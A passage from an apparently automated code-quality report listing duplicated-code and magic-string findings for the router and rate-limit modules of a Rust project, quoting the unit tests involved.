        assert_eq!(router.route_count(), 2);
        assert!(router.has_routes());
        assert_eq!(router.route_names(), vec!["s1", "s2"]);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 504

**Code:**
```
    fn test_router_route_count() {
        use crate::mocks::MockTransport;
        let router = ServerRouter {
            routes: vec![
                ServerRoute {
                    config: create_test_route("s1", "/s1", false),
                    transport: Arc::new(MockTransport::new()),
                },
                ServerRoute {
                    config: create_test_route("s2", "/s2", false),
                    transport: Arc::new(MockTransport::new()),
                }
            ],
            default_route: None,
        };
        
        assert_eq!(router.route_count(), 2);
        assert!(router.has_routes());
        assert_eq!(router.route_names(), vec!["s1", "s2"]);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 504

**Code:**
```
    fn test_router_route_count() {
        use crate::mocks::MockTransport;
        let router = ServerRouter {
            routes: vec![
                ServerRoute {
                    config: create_test_route("s1", "/s1", false),
                    transport: Arc::new(MockTransport::new()),
                },
                ServerRoute {
                    config: create_test_route("s2", "/s2", false),
                    transport: Arc::new(MockTransport::new()),
                }
            ],
            default_route: None,
        };
        
        assert_eq!(router.route_count(), 2);
        assert!(router.has_routes());
        assert_eq!(router.route_names(), vec!["s1", "s2"]);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 504

**Code:**
```
    fn test_router_route_count() {
        use crate::mocks::MockTransport;
        let router = ServerRouter {
            routes: vec![
                ServerRoute {
                    config: create_test_route("s1", "/s1", false),
                    transport: Arc::new(MockTransport::new()),
                },
                ServerRoute {
                    config: create_test_route("s2", "/s2", false),
                    transport: Arc::new(MockTransport::new()),
                }
            ],
            default_route: None,
        };
        
        assert_eq!(router.route_count(), 2);
        assert!(router.has_routes());
        assert_eq!(router.route_names(), vec!["s1", "s2"]);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 504

**Code:**
```
    fn test_router_route_count() {
        use crate::mocks::MockTransport;
        let router = ServerRouter {
            routes: vec![
                ServerRoute {
                    config: create_test_route("s1", "/s1", false),
                    transport: Arc::new(MockTransport::new()),
                },
                ServerRoute {
                    config: create_test_route("s2", "/s2", false),
                    transport: Arc::new(MockTransport::new()),
                }
            ],
            default_route: None,
        };
        
        assert_eq!(router.route_count(), 2);
        assert!(router.has_routes());
        assert_eq!(router.route_names(), vec!["s1", "s2"]);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 530

**Code:**
```
    fn test_router_with_default_route() {
        use crate::mocks::MockTransport;
        
        let default_config = create_test_route("default", "/", false);
        let default_route = ServerRoute {
            config: default_config,
            transport: Arc::new(MockTransport::new()),
        };
        
        let router = ServerRouter {
            routes: vec![
                ServerRoute {
                    config: create_test_route("api", "/api", false),
                    transport: Arc::new(MockTransport::new()),
                }
            ],
            default_route: None,
        }.with_default(default_route);
        
        // Verify default is set
        assert!(router.has_routes());
        
        // Should find /api route
        let route = router.find_route("/api/users");
        assert!(route.is_some());
        assert_eq!(route.unwrap().config.name, "api");
        
        // Unknown path should find default
        let route = router.find_route("/unknown");
        assert!(route.is_some());
        assert_eq!(route.unwrap().config.name, "default");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 530

**Code:**
```
    fn test_router_with_default_route() {
        use crate::mocks::MockTransport;
        
        let default_config = create_test_route("default", "/", false);
        let default_route = ServerRoute {
            config: default_config,
            transport: Arc::new(MockTransport::new()),
        };
        
        let router = ServerRouter {
            routes: vec![
                ServerRoute {
                    config: create_test_route("api", "/api", false),
                    transport: Arc::new(MockTransport::new()),
                }
            ],
            default_route: None,
        }.with_default(default_route);
        
        // Verify default is set
        assert!(router.has_routes());
        
        // Should find /api route
        let route = router.find_route("/api/users");
        assert!(route.is_some());
        assert_eq!(route.unwrap().config.name, "api");
        
        // Unknown path should find default
        let route = router.find_route("/unknown");
        assert!(route.is_some());
        assert_eq!(route.unwrap().config.name, "default");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 530

**Code:**
```
    fn test_router_with_default_route() {
        use crate::mocks::MockTransport;
        
        let default_config = create_test_route("default", "/", false);
        let default_route = ServerRoute {
            config: default_config,
            transport: Arc::new(MockTransport::new()),
        };
        
        let router = ServerRouter {
            routes: vec![
                ServerRoute {
                    config: create_test_route("api", "/api", false),
                    transport: Arc::new(MockTransport::new()),
                }
            ],
            default_route: None,
        }.with_default(default_route);
        
        // Verify default is set
        assert!(router.has_routes());
        
        // Should find /api route
        let route = router.find_route("/api/users");
        assert!(route.is_some());
        assert_eq!(route.unwrap().config.name, "api");
        
        // Unknown path should find default
        let route = router.find_route("/unknown");
        assert!(route.is_some());
        assert_eq!(route.unwrap().config.name, "default");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 530

**Code:**
```
    fn test_router_with_default_route() {
        use crate::mocks::MockTransport;
        
        let default_config = create_test_route("default", "/", false);
        let default_route = ServerRoute {
            config: default_config,
            transport: Arc::new(MockTransport::new()),
        };
        
        let router = ServerRouter {
            routes: vec![
                ServerRoute {
                    config: create_test_route("api", "/api", false),
                    transport: Arc::new(MockTransport::new()),
                }
            ],
            default_route: None,
        }.with_default(default_route);
        
        // Verify default is set
        assert!(router.has_routes());
        
        // Should find /api route
        let route = router.find_route("/api/users");
        assert!(route.is_some());
        assert_eq!(route.unwrap().config.name, "api");
        
        // Unknown path should find default
        let route = router.find_route("/unknown");
        assert!(route.is_some());
        assert_eq!(route.unwrap().config.name, "default");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 564

**Code:**
```
    fn test_router_get_route_name() {
        use crate::mocks::MockTransport;
        
        let router = ServerRouter {
            routes: vec![
                ServerRoute {
                    config: create_test_route("github", "/github", false),
                    transport: Arc::new(MockTransport::new()),
                }
            ],
            default_route: None,
        };
        
        assert_eq!(router.get_route_name("/github/repos"), Some("github"));
        assert_eq!(router.get_route_name("/unknown"), None);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 564

**Code:**
```
    fn test_router_get_route_name() {
        use crate::mocks::MockTransport;
        
        let router = ServerRouter {
            routes: vec![
                ServerRoute {
                    config: create_test_route("github", "/github", false),
                    transport: Arc::new(MockTransport::new()),
                }
            ],
            default_route: None,
        };
        
        assert_eq!(router.get_route_name("/github/repos"), Some("github"));
        assert_eq!(router.get_route_name("/unknown"), None);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 564

**Code:**
```
    fn test_router_get_route_name() {
        use crate::mocks::MockTransport;
        
        let router = ServerRouter {
            routes: vec![
                ServerRoute {
                    config: create_test_route("github", "/github", false),
                    transport: Arc::new(MockTransport::new()),
                }
            ],
            default_route: None,
        };
        
        assert_eq!(router.get_route_name("/github/repos"), Some("github"));
        assert_eq!(router.get_route_name("/unknown"), None);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 582

**Code:**
```
    fn test_router_get_transport() {
        use crate::mocks::MockTransport;
        
        let router = ServerRouter {
            routes: vec![
                ServerRoute {
                    config: create_test_route("test", "/test", false),
                    transport: Arc::new(MockTransport::new()),
                }
            ],
            default_route: None,
        };
        
        // Should return transport for matching route
        assert!(router.get_transport("/test/path").is_some());
        // Should return None for non-matching route
        assert!(router.get_transport("/other/path").is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 582

**Code:**
```
    fn test_router_get_transport() {
        use crate::mocks::MockTransport;
        
        let router = ServerRouter {
            routes: vec![
                ServerRoute {
                    config: create_test_route("test", "/test", false),
                    transport: Arc::new(MockTransport::new()),
                }
            ],
            default_route: None,
        };
        
        // Should return transport for matching route
        assert!(router.get_transport("/test/path").is_some());
        // Should return None for non-matching route
        assert!(router.get_transport("/other/path").is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 602

**Code:**
```
    fn test_router_debug_formatting() {
        use crate::mocks::MockTransport;
        
        let router = ServerRouter {
            routes: vec![
                ServerRoute {
                    config: create_test_route("s1", "/s1", false),
                    transport: Arc::new(MockTransport::new()),
                }
            ],
            default_route: None,
        };
        
        // Format should include route count and has_default
        let debug_str = format!("{:?}", router);
        assert!(debug_str.contains("route_count: 1"));
        assert!(debug_str.contains("has_default: false"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 99.5% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 445

**Code:**
```
    fn test_router_send_no_route() {
        let router = ServerRouter {
            routes: vec![],
            default_route: None,
        };

        let test_message = Message::request(1, "ping", None);
        let result = tokio::runtime::Runtime::new().unwrap().block_on(
            router.send("/unknown", test_message)
        );
        assert!(matches!(result, Err(RouterError::NoRoute(_))));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 99.5% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 282

**Code:**
```
    fn test_route_matcher_longest_prefix() {
        let routes = vec![
            create_test_route("api", "/api", false),
            create_test_route("api-v2", "/api/v2", false),
        ];
        let matcher = RouteMatcher::new(&routes);

        // Longer prefix should win
        assert_eq!(matcher.match_path("/api/v2/users"), Some("api-v2"));
        assert_eq!(matcher.match_path("/api/v1/users"), Some("api"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 99.2% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 333

**Code:**
```
    fn test_route_matcher_exact_match() {
        let routes = vec![
            create_test_route("exact", "/exact", false),
        ];
        let matcher = RouteMatcher::new(&routes);

        assert_eq!(matcher.match_path("/exact"), Some("exact"));
        assert_eq!(matcher.match_path("/exact/sub"), Some("exact"));
        // Note: /exactnot starts with /exact, so it matches (prefix-based routing)
        assert_eq!(matcher.match_path("/exactnot"), Some("exact"));
        // This one doesn't match
        assert_eq!(matcher.match_path("/other"), None);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 99.2% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 312

**Code:**
```
    fn test_route_matcher_empty() {
        let routes: Vec<ServerRouteConfig> = vec![];
        let matcher = RouteMatcher::new(&routes);
        assert_eq!(matcher.match_path("/any/path"), None);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 99.1% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 333

**Code:**
```
    fn test_route_matcher_exact_match() {
        let routes = vec![
            create_test_route("exact", "/exact", false),
        ];
        let matcher = RouteMatcher::new(&routes);

        assert_eq!(matcher.match_path("/exact"), Some("exact"));
        assert_eq!(matcher.match_path("/exact/sub"), Some("exact"));
        // Note: /exactnot starts with /exact, so it matches (prefix-based routing)
        assert_eq!(matcher.match_path("/exactnot"), Some("exact"));
        // This one doesn't match
        assert_eq!(matcher.match_path("/other"), None);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.8% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 378

**Code:**
```
    fn test_config_validation_stdio_missing_command() {
        let mut config = ServerRouteConfig {
            name: "stdio".to_string(),
            path_prefix: "/stdio".to_string(),
            transport: TransportType::Stdio,
            command: None,
            args: vec![],
            url: None,
            strip_prefix: false,
        };
        assert!(config.validate().is_err());
        
        config.command = Some("node".to_string());
        assert!(config.validate().is_ok());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.7% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 378

**Code:**
```
    fn test_config_validation_stdio_missing_command() {
        let mut config = ServerRouteConfig {
            name: "stdio".to_string(),
            path_prefix: "/stdio".to_string(),
            transport: TransportType::Stdio,
            command: None,
            args: vec![],
            url: None,
            strip_prefix: false,
        };
        assert!(config.validate().is_err());
        
        config.command = Some("node".to_string());
        assert!(config.validate().is_ok());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.7% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 282

**Code:**
```
    fn test_route_matcher_longest_prefix() {
        let routes = vec![
            create_test_route("api", "/api", false),
            create_test_route("api-v2", "/api/v2", false),
        ];
        let matcher = RouteMatcher::new(&routes);

        // Longer prefix should win
        assert_eq!(matcher.match_path("/api/v2/users"), Some("api-v2"));
        assert_eq!(matcher.match_path("/api/v1/users"), Some("api"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.5% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 269

**Code:**
```
    fn test_route_matcher_exact() {
        let routes = vec![
            create_test_route("github", "/github", false),
            create_test_route("filesystem", "/filesystem", false),
        ];
        let matcher = RouteMatcher::new(&routes);

        assert_eq!(matcher.match_path("/github/repos"), Some("github"));
        assert_eq!(matcher.match_path("/filesystem/read"), Some("filesystem"));
        assert_eq!(matcher.match_path("/unknown/path"), None);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.5% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 359

**Code:**
```
    fn test_router_error_transport_init() {
        let err = RouterError::TransportInit("server1".to_string(), "connection failed".to_string());
        let msg = format!("{}", err);
        assert!(msg.contains("server1"));
        assert!(msg.contains("connection failed"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.5% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 359

**Code:**
```
    fn test_router_error_transport_init() {
        let err = RouterError::TransportInit("server1".to_string(), "connection failed".to_string());
        let msg = format!("{}", err);
        assert!(msg.contains("server1"));
        assert!(msg.contains("connection failed"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.1% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 282

**Code:**
```
    fn test_route_matcher_longest_prefix() {
        let routes = vec![
            create_test_route("api", "/api", false),
            create_test_route("api-v2", "/api/v2", false),
        ];
        let matcher = RouteMatcher::new(&routes);

        // Longer prefix should win
        assert_eq!(matcher.match_path("/api/v2/users"), Some("api-v2"));
        assert_eq!(matcher.match_path("/api/v1/users"), Some("api"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.9% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 359

**Code:**
```
    fn test_router_error_transport_init() {
        let err = RouterError::TransportInit("server1".to_string(), "connection failed".to_string());
        let msg = format!("{}", err);
        assert!(msg.contains("server1"));
        assert!(msg.contains("connection failed"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.7% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 269

**Code:**
```
    fn test_route_matcher_exact() {
        let routes = vec![
            create_test_route("github", "/github", false),
            create_test_route("filesystem", "/filesystem", false),
        ];
        let matcher = RouteMatcher::new(&routes);

        assert_eq!(matcher.match_path("/github/repos"), Some("github"));
        assert_eq!(matcher.match_path("/filesystem/read"), Some("filesystem"));
        assert_eq!(matcher.match_path("/unknown/path"), None);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.6% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 333

**Code:**
```
    fn test_route_matcher_exact_match() {
        let routes = vec![
            create_test_route("exact", "/exact", false),
        ];
        let matcher = RouteMatcher::new(&routes);

        assert_eq!(matcher.match_path("/exact"), Some("exact"));
        assert_eq!(matcher.match_path("/exact/sub"), Some("exact"));
        // Note: /exactnot starts with /exact, so it matches (prefix-based routing)
        assert_eq!(matcher.match_path("/exactnot"), Some("exact"));
        // This one doesn't match
        assert_eq!(matcher.match_path("/other"), None);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.6% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 295

**Code:**
```
    fn test_config_validation() {
        let valid = create_test_route("test", "/test", false);
        assert!(valid.validate().is_ok());

        let mut invalid = create_test_route("test", "no-slash", false);
        assert!(invalid.validate().is_err());

        invalid.path_prefix = "/test".to_string();
        invalid.name = "".to_string();
        assert!(invalid.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.5% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 427

**Code:**
```
    fn test_router_new_validation() {
        // Test with invalid URL scheme to ensure validation runs
        let invalid_config = ServerRouteConfig {
            name: "invalid".to_string(),
            path_prefix: "/invalid".to_string(),
            transport: TransportType::Http,
            command: None,
            args: vec![],
            url: Some("not-a-url".to_string()),
            strip_prefix: false,
        };
        
        let result = tokio::runtime::Runtime::new().unwrap().block_on(ServerRouter::new(vec![invalid_config]));
        assert!(result.is_err());
        assert!(matches!(result.unwrap_err(), RouterError::TransportInit(_, _)));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.4% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 395

**Code:**
```
    fn test_config_validation_http_missing_url() {
        let config = ServerRouteConfig {
            name: "http".to_string(),
            path_prefix: "/http".to_string(),
            transport: TransportType::Http,
            command: None,
            args: vec![],
            url: None,
            strip_prefix: false,
        };
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.4% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 409

**Code:**
```
    fn test_config_validation_sse_missing_url() {
        let config = ServerRouteConfig {
            name: "sse".to_string(),
            path_prefix: "/sse".to_string(),
            transport: TransportType::Sse,
            command: None,
            args: vec![],
            url: None,
            strip_prefix: false,
        };
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.3% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 295

**Code:**
```
    fn test_config_validation() {
        let valid = create_test_route("test", "/test", false);
        assert!(valid.validate().is_ok());

        let mut invalid = create_test_route("test", "no-slash", false);
        assert!(invalid.validate().is_err());

        invalid.path_prefix = "/test".to_string();
        invalid.name = "".to_string();
        assert!(invalid.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.3% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 359

**Code:**
```
    fn test_router_error_transport_init() {
        let err = RouterError::TransportInit("server1".to_string(), "connection failed".to_string());
        let msg = format!("{}", err);
        assert!(msg.contains("server1"));
        assert!(msg.contains("connection failed"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.0% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 269

**Code:**
```
    fn test_route_matcher_exact() {
        let routes = vec![
            create_test_route("github", "/github", false),
            create_test_route("filesystem", "/filesystem", false),
        ];
        let matcher = RouteMatcher::new(&routes);

        assert_eq!(matcher.match_path("/github/repos"), Some("github"));
        assert_eq!(matcher.match_path("/filesystem/read"), Some("filesystem"));
        assert_eq!(matcher.match_path("/unknown/path"), None);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.3% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 269

**Code:**
```
    fn test_route_matcher_exact() {
        let routes = vec![
            create_test_route("github", "/github", false),
            create_test_route("filesystem", "/filesystem", false),
        ];
        let matcher = RouteMatcher::new(&routes);

        assert_eq!(matcher.match_path("/github/repos"), Some("github"));
        assert_eq!(matcher.match_path("/filesystem/read"), Some("filesystem"));
        assert_eq!(matcher.match_path("/unknown/path"), None);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.1% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 333

**Code:**
```
    fn test_route_matcher_exact_match() {
        let routes = vec![
            create_test_route("exact", "/exact", false),
        ];
        let matcher = RouteMatcher::new(&routes);

        assert_eq!(matcher.match_path("/exact"), Some("exact"));
        assert_eq!(matcher.match_path("/exact/sub"), Some("exact"));
        // Note: /exactnot starts with /exact, so it matches (prefix-based routing)
        assert_eq!(matcher.match_path("/exactnot"), Some("exact"));
        // This one doesn't match
        assert_eq!(matcher.match_path("/other"), None);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.0% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 427

**Code:**
```
    fn test_router_new_validation() {
        // Test with invalid URL scheme to ensure validation runs
        let invalid_config = ServerRouteConfig {
            name: "invalid".to_string(),
            path_prefix: "/invalid".to_string(),
            transport: TransportType::Http,
            command: None,
            args: vec![],
            url: Some("not-a-url".to_string()),
            strip_prefix: false,
        };
        
        let result = tokio::runtime::Runtime::new().unwrap().block_on(ServerRouter::new(vec![invalid_config]));
        assert!(result.is_err());
        assert!(matches!(result.unwrap_err(), RouterError::TransportInit(_, _)));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.7% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 352

**Code:**
```
    fn test_router_error_no_route() {
        let err = RouterError::NoRoute("/unknown".to_string());
        let msg = format!("{}", err);
        assert!(msg.contains("/unknown"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.7% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 295

**Code:**
```
    fn test_config_validation() {
        let valid = create_test_route("test", "/test", false);
        assert!(valid.validate().is_ok());

        let mut invalid = create_test_route("test", "no-slash", false);
        assert!(invalid.validate().is_err());

        invalid.path_prefix = "/test".to_string();
        invalid.name = "".to_string();
        assert!(invalid.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.5% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 312

**Code:**
```
    fn test_route_matcher_empty() {
        let routes: Vec<ServerRouteConfig> = vec![];
        let matcher = RouteMatcher::new(&routes);
        assert_eq!(matcher.match_path("/any/path"), None);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.1% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 378

**Code:**
```
    fn test_config_validation_stdio_missing_command() {
        let mut config = ServerRouteConfig {
            name: "stdio".to_string(),
            path_prefix: "/stdio".to_string(),
            transport: TransportType::Stdio,
            command: None,
            args: vec![],
            url: None,
            strip_prefix: false,
        };
        assert!(config.validate().is_err());
        
        config.command = Some("node".to_string());
        assert!(config.validate().is_ok());
    }
```

---

#### Magic value '"ServerRouter"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/router/mod.rs`
- **Line:** 43

---

#### Magic value '"route_count"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/router/mod.rs`
- **Line:** 44

---

#### Magic value '"has_default"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/router/mod.rs`
- **Line:** 45

---

#### Magic value '"ping"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/router/mod.rs`
- **Line:** 451

---

#### Magic value '"strip"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/router/mod.rs`
- **Line:** 474

---

#### Magic value '"default"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/router/mod.rs`
- **Line:** 533

---

#### Magic value '"default"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/router/mod.rs`
- **Line:** 637

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 67

**Code:**
```
    fn allowed(limit: u32, remaining: u32, reset_at: u64) -> Self {
        Self {
            allowed: true,
            retry_after_secs: None,
            limit,
            remaining,
            reset_at,
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 471

**Code:**
```
    fn test_rate_limit_enabled() {
        let config = test_config(true, 1, 2);
        let service = RateLimitService::new(&config);

        // First requests within burst should succeed
        assert!(service.check("test", None).allowed);
        assert!(service.check("test", None).allowed);

        // Next request should be rate limited
        let result = service.check("test", None);
        assert!(!result.allowed);
        assert!(result.retry_after_secs.is_some());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 471

**Code:**
```
    fn test_rate_limit_enabled() {
        let config = test_config(true, 1, 2);
        let service = RateLimitService::new(&config);

        // First requests within burst should succeed
        assert!(service.check("test", None).allowed);
        assert!(service.check("test", None).allowed);

        // Next request should be rate limited
        let result = service.check("test", None);
        assert!(!result.allowed);
        assert!(result.retry_after_secs.is_some());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 471

**Code:**
```
    fn test_rate_limit_enabled() {
        let config = test_config(true, 1, 2);
        let service = RateLimitService::new(&config);

        // First requests within burst should succeed
        assert!(service.check("test", None).allowed);
        assert!(service.check("test", None).allowed);

        // Next request should be rate limited
        let result = service.check("test", None);
        assert!(!result.allowed);
        assert!(result.retry_after_secs.is_some());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 471

**Code:**
```
    fn test_rate_limit_enabled() {
        let config = test_config(true, 1, 2);
        let service = RateLimitService::new(&config);

        // First requests within burst should succeed
        assert!(service.check("test", None).allowed);
        assert!(service.check("test", None).allowed);

        // Next request should be rate limited
        let result = service.check("test", None);
        assert!(!result.allowed);
        assert!(result.retry_after_secs.is_some());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 471

**Code:**
```
    fn test_rate_limit_enabled() {
        let config = test_config(true, 1, 2);
        let service = RateLimitService::new(&config);

        // First requests within burst should succeed
        assert!(service.check("test", None).allowed);
        assert!(service.check("test", None).allowed);

        // Next request should be rate limited
        let result = service.check("test", None);
        assert!(!result.allowed);
        assert!(result.retry_after_secs.is_some());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 471

**Code:**
```
    fn test_rate_limit_enabled() {
        let config = test_config(true, 1, 2);
        let service = RateLimitService::new(&config);

        // First requests within burst should succeed
        assert!(service.check("test", None).allowed);
        assert!(service.check("test", None).allowed);

        // Next request should be rate limited
        let result = service.check("test", None);
        assert!(!result.allowed);
        assert!(result.retry_after_secs.is_some());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 471

**Code:**
```
    fn test_rate_limit_enabled() {
        let config = test_config(true, 1, 2);
        let service = RateLimitService::new(&config);

        // First requests within burst should succeed
        assert!(service.check("test", None).allowed);
        assert!(service.check("test", None).allowed);

        // Next request should be rate limited
        let result = service.check("test", None);
        assert!(!result.allowed);
        assert!(result.retry_after_secs.is_some());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 487

**Code:**
```
    fn test_per_identity_isolation() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // Exhaust rate limit for user A
        assert!(service.check("user_a", None).allowed);
        assert!(!service.check("user_a", None).allowed);

        // User B should still have their own bucket
        assert!(service.check("user_b", None).allowed);
        assert!(!service.check("user_b", None).allowed);

        // Verify both are tracked
        assert_eq!(service.tracked_identities(), 2);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 487

**Code:**
```
    fn test_per_identity_isolation() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // Exhaust rate limit for user A
        assert!(service.check("user_a", None).allowed);
        assert!(!service.check("user_a", None).allowed);

        // User B should still have their own bucket
        assert!(service.check("user_b", None).allowed);
        assert!(!service.check("user_b", None).allowed);

        // Verify both are tracked
        assert_eq!(service.tracked_identities(), 2);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 487

**Code:**
```
    fn test_per_identity_isolation() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // Exhaust rate limit for user A
        assert!(service.check("user_a", None).allowed);
        assert!(!service.check("user_a", None).allowed);

        // User B should still have their own bucket
        assert!(service.check("user_b", None).allowed);
        assert!(!service.check("user_b", None).allowed);

        // Verify both are tracked
        assert_eq!(service.tracked_identities(), 2);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 487

**Code:**
```
    fn test_per_identity_isolation() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // Exhaust rate limit for user A
        assert!(service.check("user_a", None).allowed);
        assert!(!service.check("user_a", None).allowed);

        // User B should still have their own bucket
